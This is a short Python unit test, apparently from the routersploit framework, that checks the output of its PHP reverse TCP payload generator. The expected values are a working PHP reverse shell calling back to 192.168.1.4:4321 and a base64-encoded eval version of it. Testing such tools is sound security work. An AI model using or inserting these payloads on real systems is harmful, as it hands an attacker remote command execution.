from routersploit.modules.payloads.php.reverse_tcp import Payload


# php reverse tcp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "$s=fsockopen(\"tcp://192.168.1.4\",4321);" +
    "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"

)

# php reverse tcp payload with lhost=192.168.1.4 lport=4321 encoded with php/base64
reverse_tcp_encoded = (
    "eval(base64_decode('JHM9ZnNvY2tvcGVuKCJ0Y3A6Ly8xOTIuMTY4LjEuNCIsNDMyMSk7d2hpbGUoIWZlb2YoJHMpKXtleGVjKGZnZXRzKCRzKSwkbyk7JG89aW1wbG9kZSgiXG4iLCRvKTskby49IlxuIjtmcHV0cygkcywkbyk7fQ=='));"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_tcp
    assert payload.run() == reverse_tcp_encoded
